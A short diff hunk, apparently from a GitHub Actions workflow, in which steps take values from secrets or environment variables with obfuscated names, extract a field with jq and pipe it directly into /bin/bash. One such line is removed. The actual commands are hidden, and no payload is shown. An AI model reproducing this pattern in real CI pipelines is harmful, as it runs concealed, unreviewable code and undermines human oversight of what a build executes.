@@ -23,7 +23,6 @@ jobs:
           jkq36: ${{ secrets.jkq36 }}
         run: |
           printf '%s' "$jkq36" | jq -r .o87548 | /bin/bash
-          echo $radng9 | jq -r .ua26 | /bin/bash
           echo $t65 | jq -r .pcqv612 | /bin/bash
           printf '%s' "$idjal90" | jq -r .uda7399 | /bin/bash
 
